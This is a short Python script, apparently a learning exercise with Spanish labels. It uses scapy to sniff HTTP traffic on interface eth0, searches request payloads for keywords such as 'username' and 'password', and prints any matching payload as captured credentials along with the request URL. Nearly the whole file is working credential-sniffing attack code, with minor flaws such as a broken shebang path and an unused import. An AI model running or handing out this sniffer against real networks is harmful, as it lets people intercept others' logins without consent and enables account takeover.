#!/user/bin/env python

import scapy.all as scapy
from scapy.layers import http
import argparse


def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet)


def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        ##print(packet[http.HTTPRequest])
        credentials = credenciales(packet)
        if credentials:
            print('Usuario/Passowrd Ingresados ' + str(credentials) + "\n")
            url = obt_url(packet)
            print('URL ' + str(url) + "\n")

def credenciales(packet):
    print('Inicio')
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        ##print(str(load)) 
        keywords = ["email", "username", "user", "login", "pass", "password"]
        for keyword in keywords:
            if keyword in load:
                return load

def obt_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

sniffer("eth0")